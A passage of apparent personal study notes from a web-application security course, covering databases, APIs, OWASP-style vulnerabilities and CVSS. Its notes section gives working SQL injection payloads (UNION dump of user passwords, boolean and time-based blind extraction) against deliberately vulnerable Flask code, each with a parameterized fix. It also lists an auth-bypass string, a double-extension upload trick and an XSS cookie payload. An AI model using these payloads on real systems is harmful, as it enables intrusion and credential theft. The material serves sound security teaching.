|`Oracle`|a very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. it can be costly, even for big businesses|
|`PostgreSQL`|another free and open source relational database. it is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design|

other common SQL databases include: `SQLite`, `MariaDB`, `Amazon Aurora`, and `Azure SQL`.

Q: which relational DB is free and most common? A: `MySQL`.

#### Non relational (NoSQL)

a non relational database (`NoSQL`) does not use tables, rows, columns, primary keys, relationships, or schemas. instead, a `NoSQL` database stores data using various storage models, depending on the type of data stored.

due to the lack of a defined structure for the database, `NoSQL` databases are very scalable and flexible. when dealing with datasets that are not very well defined and structured, a `NoSQL` database would be the best choice for storing the data.

there are 4 common storage models for `NoSQL` databases:

- Key Value
- Document Based
- Wide Column
- Graph

each of the above models has a different way of storing data. for example, the `Key Value` model usually stores data in `JSON` or `XML`, and has a key for each pair, storing all of its data as its value _(see diagram, search anchor: "storing all of its data as its value")_. the above example can be represented using `JSON` as follows:

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

it looks similar to a dictionary/map/key value pair in languages like `Python` or `PHP` (e.g. `{'key':'value'}`), where the `key` is usually a string, and the `value` can be a string, dictionary, or any class object.

the `Document Based` model stores data in complex `JSON` objects and each object has certain meta data while storing the rest of the data similarly to the `Key Value` model.

Q: which NoSQL model stores JSON objects with metadata? A: `Document Based`.

some of the most common `NoSQL` databases include:

|Type|Description|
|---|---|
|`MongoDB`|the most common `NoSQL` database. it is free and open source, uses the `Document Based` model, and stores data in `JSON` objects|
|`ElasticSearch`|another free and open source `NoSQL` database. it is optimized for storing and analyzing huge datasets. as its name suggests, searching for data within this database is very fast and efficient|
|`Apache Cassandra`|also free and open source. it is very scalable and is optimized for gracefully handling faulty values|

other common `NoSQL` databases include: `Redis`, `Neo4j`, `CouchDB`, and `Amazon DynamoDB`.

Q: which NoSQL DB is optimized for search? A: `ElasticSearch`.

#### Use in Web Applications

most modern web development languages and frameworks make it easy to integrate, store, and retrieve data from various database types. but first, the database has to be installed and set up on the back end server, and once it is up and running, the web applications can start utilizing it to store and retrieve data.

for example, within a `PHP` web application, once `MySQL` is up and running, i can connect to the database server with:

```php
$conn = new mysqli("localhost", "user", "pass");
```

then, i can create a new database with:

```php
$sql = "CREATE DATABASE database1";
$conn->query($sql)
```

after that, i can connect to my new database, and start using the `MySQL` database through `MySQL` syntax, right within `PHP`, as follows:

```php
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```

Q: which PHP class opens a MySQL connection? A: `mysqli`.

web applications usually use user input when retrieving data. for example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the database(s).

```php
$searchInput = $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```

finally, the web application sends the result back to the user:

```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

this basic example shows how easy it is to utilize databases. however, if not securely coded, database code can lead to a variety of issues, like SQL Injection vulnerabilities.

Q: which line makes this code injectable? A: user input pasted straight into the query.

#### exercise questions

**question 1:** what type of database is Google's Firebase Database?

answer recorded in the module: `nosql`

---

### 1.14 Development Frameworks & APIs

in addition to web servers that can host web applications in various languages, there are many common web development frameworks that help in developing core web application files and functionality. with the increased complexity of web applications, it may be challenging to create a modern and sophisticated web application from scratch. hence, most of the popular web applications are developed using web frameworks.

as most web applications share common functionality (such as user registration), web development frameworks make it easy to quickly implement this functionality and link them to the front end components, making a fully functional web application. some of the most common web development frameworks include:

- `Laravel` (`PHP`): usually used by startups and smaller companies, as it is powerful yet easy to develop for.
- `Express` (`Node.JS`): used by `PayPal`, `Yahoo`, `Uber`, `IBM`, and `MySpace`.
- `Django` (`Python`): used by `Google`, `YouTube`, `Instagram`, `Mozilla`, and `Pinterest`.
- `Rails` (`Ruby`): used by `GitHub`, `Hulu`, `Twitch`, `Airbnb`, and even `Twitter` in the past.

it must be noted that popular websites usually utilize a variety of frameworks and web servers, rather than just one.

Q: which framework pairs with Python? A: `Django`.

#### APIs

an important aspect of back end web application development is the use of Web APIs and HTTP Request parameters to connect the front end and the back end, to be able to send data back and forth between front end and back end components and carry out various functions within the web application.

for the front end component to interact with the back end and ask for certain tasks to be carried out, they utilize APIs to ask the back end component for a specific task with specific input. the back end components process these requests, perform the necessary functions, and return a certain response to the front end components, which finally renders the end user's output on the client side.

Q: how does the front end ask the back end for work? A: through APIs.

##### Query Parameters

the default method of sending specific arguments to a web page is through `GET` and `POST` request parameters. this allows the front end components to specify values for certain parameters used within the page for the back end components to process them and respond accordingly.

for example, a `/search.php` page would take an `item` parameter, which may be used to specify the search item. passing a parameter through a `GET` request is done through the URL (`/search.php?item=apples`), while `POST` parameters are passed through `POST` data at the bottom of the `HTTP` request:

```http
POST /search.php HTTP/1.1
...SNIP...

item=apples
```

query parameters allow a single page to receive various types of input, each of which can be processed differently. for certain other scenarios, Web APIs may be much quicker and more efficient to use. the Web Requests module takes a deeper dive into `HTTP` requests.

Q: where do POST parameters travel? A: in the request body.

##### Web APIs

an API (Application Programming Interface) is an interface within an application that specifies how the application can interact with other applications. for web applications, it is what allows remote access to functionality on back end components. APIs are not exclusive to web applications and are used for software applications in general. web APIs are usually accessed over the `HTTP` protocol and are usually handled and translated through web servers.

a weather web application, for example, may have a certain API to retrieve the current weather for a certain city. i can request the API URL and pass the city name or city id, and it would return the current weather in a `JSON` object. another example is Twitter's API, which allows me to retrieve the latest Tweets from a certain account in `XML` or `JSON` formats, and even allows me to send a Tweet (if authenticated), and so on.

to enable the use of APIs within a web application, the developers have to develop this functionality on the back end of the web application by using the API standards like `SOAP` or `REST`.

Q: which two standards enable web APIs? A: `SOAP` and `REST`.

##### SOAP

the `SOAP` (Simple Objects Access) standard shares data through `XML`, where the request is made in `XML` through an HTTP request, and the response is also returned in `XML`. front end components are designed to parse this `XML` output properly. the following is an example `SOAP` message:

```xml
<?xml version="1.0"?>

<soap:Envelope
xmlns:soap="http://www.example.com/soap/soap/"
soap:encodingStyle="http://www.w3.org/soap/soap-encoding">

<soap:Header>
</soap:Header>

<soap:Body>
  <soap:Fault>
  </soap:Fault>
</soap:Body>

</soap:Envelope>
```

`SOAP` is very useful for transferring structured data (e.g. an entire class object), or even binary data, and is often used with serialized objects, all of which enables sharing complex data between front end and back end components and parsing it properly. it is also very useful for sharing stateful objects (e.g. sharing/changing the current state of a web page), which is becoming more common with modern web applications and mobile applications.

however, `SOAP` may be difficult to use for beginners or require long and complicated requests even for smaller queries, like basic `search` or `filter` queries. this is where the `REST` API standard is more useful.

Q: which data format does SOAP use? A: `XML`.

##### REST

the `REST` (Representational State Transfer) standard shares data through the URL path (e.g. `search/users/1`), and usually returns the output in `JSON` format (e.g. `userid 1`).

unlike Query Parameters, `REST` APIs usually focus on pages that expect one type of input passed directly through the URL path, without specifying its name or type. this is usually useful for queries like `search`, `sort`, or `filter`. this is why `REST` APIs usually break web application functionality into smaller APIs and utilize these smaller API requests to allow the web application to perform more advanced actions, making the web application more modular and scalable.

responses to `REST` API requests are usually made in `JSON` format, and the front end components are then developed to handle this response and render it properly. other output formats for `REST` include `XML`, `x-www-form-urlencoded`, or even raw data. as seen previously in the `database` section, the following is an example of a `JSON` response to the API request `GET /category/posts/`:

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

`REST` uses various HTTP methods to perform different actions on the web application:

- `GET` request to retrieve data
- `POST` request to create data (non idempotent)
- `PUT` request to create or replace existing data (idempotent)
- `DELETE` request to remove data

Q: which REST method replaces existing data? A: `PUT`.

#### exercise questions

**question 1:** use GET request '/index.php?id=0' to search for the name of the user with id number 1?

answer recorded in the module: `superadmin`

#### my personal actions

```bash
curl -X GET (ip)/index.php?id=1
```

---

### 1.15 Common Web Vulnerabilities

if i were performing a penetration test on an internally developed web application, or did not find any public exploits for a public web application, i may manually identify several vulnerabilities. i may also uncover vulnerabilities caused by misconfigurations, even in publicly available web applications, since these types of vulnerabilities are not caused by the public version of the web application but by a misconfiguration made by the developers. the below examples are some of the most common vulnerability types for web applications, part of the OWASP Top 10 vulnerabilities for web applications.

Q: can public apps be vulnerable through misconfiguration? A: yes, by developer misconfig.

#### Broken Authentication/Access Control

`Broken authentication` and `Broken Access Control` are among the most common and most dangerous vulnerabilities for web applications.

`Broken Authentication` refers to vulnerabilities that allow attackers to bypass authentication functions. for example, this may allow an attacker to login without having a valid set of credentials, or allow a normal user to become an administrator without having the privileges to do so.

`Broken Access Control` refers to vulnerabilities that allow attackers to access pages and features they should not have access to. for example, a normal user gaining access to the admin panel.

for example, `College Management System 1.2` has a simple Auth Bypass vulnerability that allows me to login without having an account, by inputting the following for the email field: `' or 0=0 #`, and using any password with it.

Q: which flaw lets me reach the admin panel? A: Broken Access Control.

#### Malicious File Upload

another common way to gain control over web applications is through uploading malicious scripts. if the web application has a file upload feature and does not properly validate the uploaded files, i may upload a malicious script (e.g. a `PHP` script), which will allow me to execute commands on the remote server.

even though this is a basic vulnerability, many developers are not aware of these threats, so they do not properly check and validate uploaded files. furthermore, some developers do perform checks and attempt to validate uploaded files, but these checks can often be bypassed, which would still allow me to upload malicious scripts.

for example, the WordPress Plugin `Responsive Thumbnail Slider 1.0` can be exploited to upload any arbitrary file, including malicious scripts, by uploading a file with a double extension (e.g. `shell.php.jpg`). there's even a Metasploit Module that allows me to exploit this vulnerability easily.

Q: what trick bypassed that plugin's upload check? A: a double extension.

#### Command Injection

many web applications execute local Operating System commands to perform certain processes. for example, a web application may install a plugin of my choosing by executing an OS command that downloads that plugin, using the plugin name provided. if not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command (e.g. as the plugin name), which allows them to directly execute commands on the back end server and gain control over it. this type of vulnerability is called command injection.

this vulnerability is widespread, as developers may not properly sanitize user input or use weak tests to do so, allowing attackers to bypass any checks or filtering put in place and execute their commands.

for example, the WordPress Plugin `Plainview Activity Monitor 20161228` has a vulnerability that allows attackers to inject their command in the `ip` value, by simply adding `| COMMAND...` after the `ip` value.

Q: where was the command injected in that plugin? A: the `ip` value.

#### SQL Injection (SQLi)

another very common vulnerability in web applications is a SQL Injection vulnerability. similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user supplied input.

for example, in the `database` section, the module showed how a web application would use user input to search within a certain table, with the following line of code:

```php
$query = "select * from users where name like '%$searchInput%'";
```

if the user input is not properly filtered and validated (as is the case with `Command Injections`), i may execute another SQL query alongside this query, which may eventually allow me to take control over the database and its hosting server.

for example, the same previous `College Management System 1.2` suffers from a SQL injection vulnerability, in which i can execute another `SQL` query that always returns `true`, meaning i successfully authenticated, which allows me to log in to the application. i can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.

i will see these vulnerabilities again and again in my learning journey and real world assessments. it is important to become familiar with each of these, as even a basic understanding of each will give me a leg up in any information security realm. later modules will cover each of these vulnerabilities in depth.

Q: what makes a query always return true? A: injected SQL like `or 0=0`.

#### exercise questions

**question 1:** to which of the above categories does public vulnerability 'CVE-2014-6271' belongs to?

answer recorded in the module: `Command Injection`

#### my personal actions

##### sql attack notes (again just from another resource)

**the core model, same pattern as xss:** sql engines parse a query string and can't tell "this is alice's data" from "this is part of my query logic" unless you keep them in separate channels. if alice's input contains a `'`, and that string gets glued directly into the sql text, she can break out of the intended string literal and inject her own sql syntax, which the parser happily tokenizes as real query logic.

|type|feedback alice sees|how she extracts data|classic giveaway|
|---|---|---|---|
|union based (in band)|query results rendered directly on the page|attaches a second `select` via `UNION`, reads the output straight off the page|error messages, extra columns appearing in output|
|boolean blind|page renders differently (login success/fail, item found/not found) for true vs false conditions, but no data shown|asks yes/no questions one bit at a time, rebuilds data char by char from true/false responses|no errors, no extra data on page, response size/content subtly differs|
|time based blind|page looks identical regardless of true/false, nothing visibly differs|injects a conditional `sleep()`, measures response time to infer true/false|identical responses, but request duration varies|

---

**1. union based sqli, flask**

```python
# app.py, vulnerable, sqlite backend
import sqlite3
from flask import Flask, request

app = Flask(__name__)

def get_db():
    return sqlite3.connect('shop.db')

@app.route('/product')
def product():
    pid = request.args.get('id', '1')
    conn = get_db()
    cur = conn.cursor()
    # vulnerable: string formatting straight into the query
    query = f"SELECT name, price, description FROM products WHERE id = {pid}"
    cur.execute(query)
    row = cur.fetchone()
    return f"<h2>{row[0]}</h2><p>price: {row[1]}</p><p>{row[2]}</p>"
```

**alice's move:** she first probes how many columns the original query returns, since `UNION` requires matching column counts:

```
http://localhost:5000/product?id=1 ORDER BY 4--
```

that one errors out (only 3 columns exist), `ORDER BY 3--` works, so she knows there are 3 columns. then she unions in a query against the `users` table to dump credentials straight into the visible page:

```
http://localhost:5000/product?id=-1 UNION SELECT username, password, email FROM users--
```

**under the hood:**

|step|who|what happens|
|---|---|---|
|1|alice|sends the crafted `id` param in the url|
|2|flask|`request.args.get('id')` returns the raw string, f string glues it directly into `query`|
|3|final query string sent to sqlite|`SELECT name, price, description FROM products WHERE id = -1 UNION SELECT username, password, email FROM users--`|
|4|sqlite parser|tokenizes this as a single valid statement, `id = -1` matches nothing (no product has negative id, that's intentional so the first `SELECT` returns zero rows), `UNION` then appends the second `SELECT`'s rows, `--` comments out anything flask might have appended after|
|5|sqlite query planner|executes both selects, concatenates result sets since `UNION` requires same column count, which alice confirmed in her probing step|
|6|flask|`cur.fetchone()` happily returns the first row of the unioned result, which is actually `(username, password, email)` from the `users` table|
|7|response|renders straight into `<h2>{row[0]}</h2>` etc, alice now sees a real username/password pair rendered on the page|

the sql engine has zero concept of "this `-1` came from a url param, be suspicious of what follows it." it just sees a syntactically valid compound statement and executes it in full, your original query and alice's injected one are indistinguishable to the parser once they're concatenated into one string.

**fix:**

```python
@app.route('/product')
def product():
    pid = request.args.get('id', '1')
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT name, price, description FROM products WHERE id = ?", (pid,))
    row = cur.fetchone()
    return f"<h2>{row[0]}</h2><p>price: {row[1]}</p><p>{row[2]}</p>"
```

the `?` placeholder means the driver sends the query structure and the data as two separate things over the wire to sqlite, not as one concatenated string. the database literally never parses `pid` as sql syntax, it's bound as a value after the query plan is already fixed. this closes the entire class of attack, no amount of `'`, `UNION`, or `--` in `pid` can change the query's structure anymore, it can only ever be "the value to compare `id` against."

---

**2. boolean based blind sqli, flask**

imagine the page doesn't leak data directly, it just shows "found" or "not found", like a login check:

```python
# app.py, vulnerable, no useful output leaked
@app.route('/check_user')
def check_user():
    username = request.args.get('username', '')
    conn = get_db()
    cur = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cur.execute(query)
    row = cur.fetchone()
    if row:
        return "user exists"
    return "user not found"
```

**alice's move:** she can't see any data, but she can ask true/false questions. first, confirm injection is possible:

```
http://localhost:5000/check_user?username=admin' AND '1'='1
http://localhost:5000/check_user?username=admin' AND '1'='2
```

first returns "user exists", second returns "user not found", same username, different boolean tail, different result, confirms injection works. now she extracts the admin's password one character at a time:

```
http://localhost:5000/check_user?username=admin' AND SUBSTR(password,1,1)='a
```

she iterates through every letter/digit for position 1, whichever guess returns "user exists" tells her the first character. then repeats for position 2, 3, etc, fully automatable with a script (this is literally what `sqlmap` automates).

**under the hood:**

|step|who|what happens|
|---|---|---|
|1|alice|sends `username=admin' AND SUBSTR(password,1,1)='a`|
|2|flask|glues it into `query` raw, final string: `SELECT * FROM users WHERE username = 'admin' AND SUBSTR(password,1,1)='a'`|
|3|sqlite parser|the injected `'` closes alice's intended string literal early, `AND SUBSTR(...)='a'` becomes a second real condition the parser evaluates, not literal text anymore|
|4|sqlite query planner|evaluates both conditions: username must equal `admin` AND the first character of that row's password must equal `a`|
|5|result|if both true, the row is returned, flask's `if row:` branch hits, page says "user exists". if the password doesn't start with `a`, zero rows match, "user not found"|
|6|alice|reads which branch fired, that single bit of information (true/false) is the leak, she repeats with every character/position until the whole password is reconstructed|

no data is ever directly displayed, that's the "blind" part, but the control flow of the response (which string gets returned) is itself the side channel alice reads from. she's using the app's own `if row:` logic as a one bit oracle, asked thousands of times.

**fix:** same as before, parameterized queries. but note, parameterization alone is necessary, it's not the only layer, you also want generic error handling (don't ever show raw db errors to users) and rate limiting on endpoints like this, since blind extraction needs hundreds to thousands of requests to fully work, a rate limit makes the attack impractically slow even if some other defense fails.

```python
@app.route('/check_user')
def check_user():
    username = request.args.get('username', '')
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE username = ?", (username,))
    row = cur.fetchone()
    return "user exists" if row else "user not found"
```

---

**3. time based blind sqli, flask**

now imagine the response doesn't even differ visibly for true vs false, same page, same content, every time:

```python
# app.py, vulnerable, response looks identical regardless of query result
@app.route('/login_check')
def login_check():
    username = request.args.get('username', '')
    conn = get_db()
    cur = conn.cursor()
    query = f"SELECT id FROM users WHERE username = '{username}' AND active = 1"
    cur.execute(query)
    cur.fetchone()
    return "request processed"  # always the same, regardless of result
```

**alice's move:** since there's zero observable difference in content, she injects a conditional delay and measures wall clock time instead:

```
http://localhost:5000/login_check?username=admin' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN sqlite_sleep(3000) ELSE 0 END FROM users WHERE username='admin')--
```

(sqlite uses a slightly different sleep mechanism than mysql's `SLEEP(5)` or postgres' `pg_sleep(5)`, but the concept is identical across all three engines.) she times the request: if it takes about 3 seconds to respond, the guessed character is right, if it responds instantly, it's wrong. same char by char extraction as boolean blind, just using latency as the oracle instead of response content.

**under the hood:**

|step|who|what happens|
|---|---|---|
|1|alice|sends a payload containing a conditional sleep, wrapped in a `CASE WHEN`|
|2|flask|glues the raw string into `query`, same as always|
|3|sql engine parser|parses the injected `CASE WHEN SUBSTR(password,1,1)='a' THEN sleep(...) ELSE 0 END` as a real, executable scalar subexpression inside the query|
|4|sql engine execution|evaluates the condition for the matching row, if true, actually calls the sleep function and blocks query execution for that duration before continuing|
|5|flask|`cur.execute()` blocks on the python side waiting for the db driver to return, since the underlying query itself hasn't finished executing|
|6|http response|sent back to alice only after the full query (including the sleep, if triggered) completes|
|7|alice|measures elapsed time client side with a simple timer around her http request, infers true/false purely from latency, since the response text itself ("request processed") never changes|

this is the sneakiest variant because it leaves almost no application layer trace, logs show a normal looking request, the page content is identical every time, the only artifact is unusual response latency, which blends into normal network jitter unless someone's specifically looking for timing anomalies across many requests from the same source.

**fix:** identical core fix, parameterized queries close this exactly the same way as the other two, since the entire attack depends on alice's string being parsed as sql syntax in the first place:

```python
@app.route('/login_check')
def login_check():
    username = request.args.get('username', '')
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id FROM users WHERE username = ? AND active = 1", (username,))
    cur.fetchone()
    return "request processed"
```

with the `?` placeholder, `username` is bound as a single opaque string value. there is no "closing the string literal early" because there's no string literal in the query text at all anymore, the database never concatenates alice's input into something it reparses as sql.

---

**cybersec angle, same trust boundary lens as xss:** every single one of these, union, boolean blind, time blind, has the exact same root cause as reflected/stored/dom xss: untrusted input being concatenated into a string that an interpreter (sql engine instead of html parser) then parses as executable syntax. the fix pattern is also structurally identical: keep data and code in separate channels (parameterized queries = the sql equivalent of `escape()`/`textContent` in xss). the only thing that differs across the three sqli types is how much signal alice gets back per request, direct data, a single bit, or a timing bit, which is purely a detectability/exfiltration speed question, not a different vulnerability at the root.

|sqli type|signal per request|detection difficulty for blue team|
|---|---|---|
|union based|full row of data|easy, data literally shows up where it shouldn't, obvious in logs/waf|
|boolean blind|1 bit (which branch fired)|medium, need to notice abnormal volume of near identical requests with tiny param variations|
|time based blind|1 bit (fast vs slow response)|hard, content is identical every time, only latency analysis across many requests reveals it|

---

### 1.16 Public Vulnerabilities

the most critical back end component vulnerabilities are those that can be attacked externally and can be leveraged to take control over the back end server without needing local access to that server (i.e. external penetration testing). these vulnerabilities are usually caused by coding mistakes made during the development of a web application's back end components. so, there is a wide variety of vulnerability types in this area, ranging from basic vulnerabilities that can be exploited with relative ease to sophisticated vulnerabilities requiring deep knowledge of the entire web application.

Q: what causes most of these vulnerabilities? A: coding mistakes in back end components.

#### Public CVE

as many organizations deploy web applications that are publicly used, like open source and proprietary web applications, these web applications tend to be tested by many organizations and experts around the world. this leads to frequently uncovering a large number of vulnerabilities, most of which get patched and then shared publicly and assigned a CVE (Common Vulnerabilities and Exposures) record and score.

many penetration testers also make proof of concept exploits to test whether a certain public vulnerability can be exploited, and usually make these exploits available for public use, for testing and educational purposes. this makes searching for public exploits the very first step i must go through for web applications.

Q: what is the very first step for web apps? A: search for public exploits.

> tip: the first step is to identify the version of the web application. this can be found in many locations, like the source code of the web application. for open source web applications, i can check the repository of the web application and identify where the version number is shown (e.g. in a `version.php` page), and then check the same page on my target web application to confirm.

once i identify the web application version, i can search Google for public exploits for this version of the web application. i can also utilize online exploit databases, like Exploit DB, Rapid7 DB, or Vulnerability Lab. the module shows a search for WordPress public exploits in Rapid7 DB _(see screenshot, search anchor: "search for WordPress public exploits")_.

i would usually be interested in exploits with a CVE score of 8-10, or exploits that lead to `Remote Code Execution`. other types of public exploits should also be considered if none of the above is available.

furthermore, these vulnerabilities are not exclusive to web applications and apply to components utilized by the web application. if a web application uses external components (e.g. a plugin), i should also search for vulnerabilities for these external components.

Q: which scores or impact do i prioritize? A: CVE 8-10 or RCE.

#### Common Vulnerability Scoring System (CVSS)

the Common Vulnerability Scoring System (CVSS) is an open source industry standard for assessing the severity of security vulnerabilities. this scoring system is often used as a standard measurement for organizations and governments that need to produce accurate and consistent severity scores for their systems' vulnerabilities. this helps with the prioritization of resources and the response to a given threat.

CVSS scores are based on a formula that uses several metrics: `Base`, `Temporal`, and `Environmental`. when calculating the severity of a vulnerability using CVSS, the `Base` metrics produce a score ranging from 0 to 10, modified by applying `Temporal` and `Environmental` metrics. the National Vulnerability Database (NVD) provides CVSS scores for almost all known, publicly disclosed vulnerabilities. at this time, the NVD only provides `Base` scores based upon a given vulnerability's inherent characteristics. the current scoring systems in place are CVSS v2 and CVSS v3. there are several differences between the v2 and v3 systems, namely changes to the `Base` and `Environmental` groups to account for additional metrics. the module links more information about the differences between the two scoring systems.

Q: which three metric groups feed CVSS? A: Base, Temporal, Environmental.

CVSS scoring ratings differ slightly between V2 and V3 as can be seen in the following tables:

**CVSS V2.0 Ratings**

|Severity|Base Score Range|
|---|---|
|Low|0.0-3.9|
|Medium|4.0-6.9|
|High|7.0-10.0|

**CVSS V3.0 Ratings**

|Severity|Base Score Range|
|---|---|
|None|0.0|
|Low|0.1-3.9|
|Medium|4.0-6.9|
|High|7.0-8.9|
|Critical|9.0-10.0|

Q: which v3 range is Critical? A: 9.0-10.0.

the NVD does not factor in `Temporal` and `Environmental` metrics because the former can change over time due to external events, and the latter is a customized metric based on the potential impact of the vulnerability on a given organization. the NVD provides a CVSS v2 calculator and a CVSS v3 calculator that organizations can use to factor additional risk from `Temporal` and `Environmental` data unique to them. the calculators are very interactive and can be used to fine tune the CVSS score to my environment. i can move over each metric to read more about it and determine exactly how it applies to my organization. the module shows an example view of the CVSS v3 calculator _(see screenshot, search anchor: "example view of the CVSS v3 calculator")_.

Q: why doesn't the NVD score Temporal metrics? A: they change over time.

i should play around with the CVSS calculator and see how the various metrics can be adjusted to arrive at a given score. i should review some CVEs and attempt to arrive at the same CVSS score. how does the CVSS score change when i apply `Temporal` and `Environmental` metrics? the module links a handy guide that is extremely useful for understanding V2 and V3 and how to use the calculators to arrive at a given score.

#### Back end Server Vulnerabilities

like public vulnerabilities for web applications, i should also consider looking for vulnerabilities for other back end components, like the back end server or the webserver.

the most critical vulnerabilities for back end components are found in web servers, as they are publicly accessible over the `TCP` protocol. an example of a well known web server vulnerability is the `Shell Shock` vulnerability, which affected Apache web servers released during and before 2014 and utilized `HTTP` requests to gain remote control over the back end server.

Q: why are web server vulns the most critical? A: they are publicly reachable over TCP.

as for vulnerabilities in the back end server or the database, they are usually utilized after gaining local access to the back end server or back end network, which may be gained through `external` vulnerabilities or during internal penetration testing. they are usually used to gain high privileged access on the back end server or the back end network, or gain control over other servers within the same network. although not directly exploitable externally, these vulnerabilities are still critical and need to be patched to protect the entire web application from being compromised.

Q: when are back end server vulns usually used? A: after gaining local access.

#### exercise questions

**question 1:** what is the CVSS v2.0 score of the public vulnerability CVE-2017-0144?

answer recorded in the module: `9.3`

---

### 1.17 Next Steps

in this module, i learned some, but by no means all, web application basics. i should now have a fundamental understanding of how a web application is built, how it works, and what dangers it can introduce into a corporate environment.

it is important to take a hands on approach to develop my understanding further and apply the topics taught in this module. the module recommends reviewing the material in combination with developing a small web application. some next steps that can be taken are:

| Step | To Do                                                                   |
| ---- | ----------------------------------------------------------------------- |
| 1    | webserver + database docker with docker-compose                         |
| 2    | Create an `HTML` page                                                   |
| 3    | Design it with `CSS`                                                    |
| 4    | Add some simple functions with `JavaScript`                             |
| 5    | Program a simple web application                                        |
| 6    | Connect my web application to the database                              |
| 7    | Experiment with APIs                                                    |
| 8    | Test your application for various vulnerabilities and security holes    |
| 9    | Try to adjust your code and configurations to close the vulnerabilities |

will upload actual thingies on my github down [here](https://github.com/cybermaxxer/vulnboard)

---

## 2. Structured Breakdown (Cheat Sheet)

|Concept|Explanation|Practical Usage|
|---|---|---|
|client server model|the browser (front end) sends HTTP requests, the server (back end) processes them and sends the result back|tells me where each flaw lives: client side or server side|
|infrastructure models|Client Server, One Server, Many Servers One Database, Many Servers Many Databases|One Server is "all eggs in one basket"; Many Servers Many Databases gives the best segmentation and redundancy|
|three tier architecture|Presentation (HTML, JS, CSS), Application (processes requests, checks authorization and privileges), Data (finds and stores the data)|a design error like missing RBAC can't be patched in code, it needs a costly redesign|
|microservices vs serverless|microservices are independent single task services with stateless communication; serverless runs in stateless containers managed by the cloud provider|enumerate each service and 3rd party integration separately when testing|
|front end vs back end|front end is HTML, CSS, JS in the browser; back end is servers, web servers, databases, frameworks|front end source allows whitebox review, back end is blackbox unless source leaks (e.g. Local File Inclusion)|
|HTML DOM|elements form a tree under `document`, located by id, tag name, or class|know exactly where an element lives before manipulating it with XSS|
|URL encoding|unsafe ASCII characters become `%` plus two hex digits (space `%20`, `'` is `%27`)|encode payloads for URLs, decode with Burp Suite's decoder/encoder|
|CSS|`element { property : value; }` rules style HTML elements, frameworks like Bootstrap speed it up|ids and classes tie HTML to style and JavaScript|
|JavaScript|runs client side in the browser engine, drives functionality and HTTP requests (Ajax)|`innerHTML` assignments are where injection shows up|
|sensitive data exposure|sensitive data in clear text in the page source (comments, hidden links, imported JS)|`ctrl + u` first, hunt for leftovers like `test:test` credentials|
|HTML injection|unfiltered input rendered as HTML|fake login forms to harvest credentials, web page defacing|
|XSS|injected JavaScript executes client side; types: Reflected, Stored, DOM|`#"><img src=/ onerror=alert(document.cookie)>` shows the cookie, an attacker can steal the session|
|CSRF|a script abuses the victim's logged in session to fire requests, e.g. change a password|load a remote `exploit.js`; defend with sanitization, validation, anti CSRF tokens, `SameSite`|
|back end stacks|LAMP, WAMP, WINS, MAMP, XAMPP|identifying the stack tells me which tests and public exploits to try|
|HTTP status codes|`2xx` success, `3xx` redirect, `4xx` client error, `5xx` server error|`200 OK`, `301`/`302` redirects, `403` forbidden, `404` not found, `500` server error|
|web servers|Apache (more than 40%), NGINX (roughly 30%), IIS (around 15%)|Apache pairs with PHP, IIS with .NET and Active Directory, NGINX handles heavy traffic|
|SQL vs NoSQL|SQL uses tables, rows, columns, keys, and a Schema; NoSQL uses Key Value, Document Based, Wide Column, Graph models|know which database is behind the app before choosing an injection approach|
|GET vs POST parameters|GET puts parameters in the URL (`/search.php?item=apples`), POST puts them in the request body|test both ways of passing input|
|SOAP vs REST|SOAP shares data through XML; REST uses the URL path and usually returns JSON|REST maps methods to actions: GET, POST, PUT, DELETE|
|common web vulnerabilities|Broken Authentication/Access Control, Malicious File Upload, Command Injection, SQL Injection|`' or 0=0 #` auth bypass, `shell.php.jpg` double extension, injecting a command after the `ip` value|
|public vulnerabilities and CVSS|find the app version, search CVE records and exploit databases; CVSS scores run 0 to 10 (v3 Critical is 9.0-10.0)|prioritize CVE scores of 8-10 or anything leading to Remote Code Execution|

---

## 3. Feynman Checks

1. **i find a comment box that renders my input with `innerHTML`. what is the difference between proving HTML Injection and proving XSS, and what does `<img src=/ onerror=alert(document.cookie)>` prove?** → HTML Injection only proves the page renders my input as HTML, like a `<style>` block that changes the background or a fake login form. XSS proves my JavaScript executes. the payload works because the image source can't load, so the `onerror` handler runs my JavaScript, and `document.cookie` showing up in the alert proves i can read the user's cookie. if the comment is stored in the database, it hits every visitor, not just me.
    
2. **i land on a target and spot a version number in the page source. how do i go from that to a public exploit, and how do i decide what to try first?** → i identify the exact version (page source, or a version file like `version.php` on open source apps, confirmed on the target), then search Google and exploit databases like Exploit DB, Rapid7 DB, or Vulnerability Lab. i also check any plugins or external components, since they have their own CVEs. i prioritize CVE scores of 8-10 or anything that gives Remote Code Execution. the NVD only publishes Base scores, so the Temporal and Environmental metrics are mine to adjust for the target.
    
3. **two web apps share one database server and i compromise one webserver through SQL injection. what is still protected, what is exposed, and which model fixes the exposure?** → in Many Servers, One Database the segmentation means the other webserver isn't directly affected, but the shared database is reachable through the compromised app, so any data that app can access is exposed. Many Servers, Many Databases fixes this: each app gets its own database and can only reach its private data plus the common shared data, backed by proper access control.
    

---

## 4. Omitted Chuff

nothing from the module's theory, tables, code, or examples was cut. what i left out is page furniture, not content:

